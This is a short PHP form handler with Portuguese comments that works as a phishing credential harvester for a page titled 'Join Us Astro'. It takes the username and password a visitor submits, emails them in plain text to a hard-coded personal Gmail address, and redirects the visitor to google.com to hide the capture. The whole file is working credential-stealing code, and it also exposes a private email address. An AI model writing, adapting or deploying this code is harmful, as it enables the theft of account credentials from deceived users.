
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nomeUsuario = htmlspecialchars($_POST["username"]);
    $senha = htmlspecialchars($_POST["password"]);

    // email que vai ser enviada as informacões
    $para = "matheus147.157m@gmail.com";
    $assunto = "Envio de Formulário - Join Us Astro";

    $mensagem = "Nome de Usuário: $nomeUsuario\n";
    $mensagem .= "Senha: $senha\n";


    // Envia o e-mail
    mail($para, $assunto, $mensagem);

    // Redireciona de volta para o formulário ou para uma página de agradecimento
    header("Location: google.com"); // 
    exit();
}
?>



